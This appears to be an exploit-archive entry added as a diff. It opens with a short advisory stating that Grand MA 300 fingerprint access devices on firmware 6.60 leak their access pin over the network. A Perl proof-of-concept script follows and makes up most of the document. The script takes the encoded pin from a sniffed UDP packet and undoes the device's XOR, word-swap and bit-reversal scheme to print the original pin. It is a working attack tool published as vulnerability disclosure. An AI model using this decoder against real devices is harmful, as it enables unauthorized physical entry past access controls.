@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/69390/info
+
+Grand MA 300 is prone to multiple security weaknesses.
+
+Attackers can exploit these issues to disclose the access pin by sniffing network traffic or perform brute-force attacks on pin to gain unauthorized access. This may aid in other attacks.
+
+Grand MA 300 running firmware version 6.60 is vulnerable. 
+
+#!/usr/bin/perl
+#
+# This script calculates the original pin based on the pin
+# retrieved on the wire for the Grand MA 300 fingerprint access device
+#
+# look for a UDP packet starting with 0x4E 0x04, the last 4 bytes are the
+# encoded pin
+#
+# written by Eric Sesterhenn <eric.sesterhenn () lsexperts de>
+# http://www.lsexperts.de
+#
+use warnings;
+use strict;
+
+my $cid = 0;     # connection id
+my $ret = 0x4B00A987; # pin on the wire
+
+# get gettickcount value (third byte)
+my $gc = ($ret >> 16) & 0xFF;
+
+# set third byte to magic value (so it becomes zero when we xor it later with the magic value)
+$ret =  $ret | 0x005A0000;
+
+# xor all, but third byte with last byte of gettickcount
+$ret ^= $gc + ($gc << 8) + ($gc << 24);
+
+# switch the words
+$ret = (($ret & 0xFFFF) << 16) + ($ret >> 16);
+
+# xor with magic value
+$ret ^= 0x4F534B5A;
+
+# substract the connection id
+$ret -= $cid;
+
+my $fin = 0;
+# revert the bits
+for (my $i = 0; $i < 32; $i++) {
+  $fin *= 2;
+  if ($ret & 1) {
+    $fin = $fin + 1;
+  }
+  $ret = $ret / 2;
+}
+
+printf("final: %X \n", $fin);
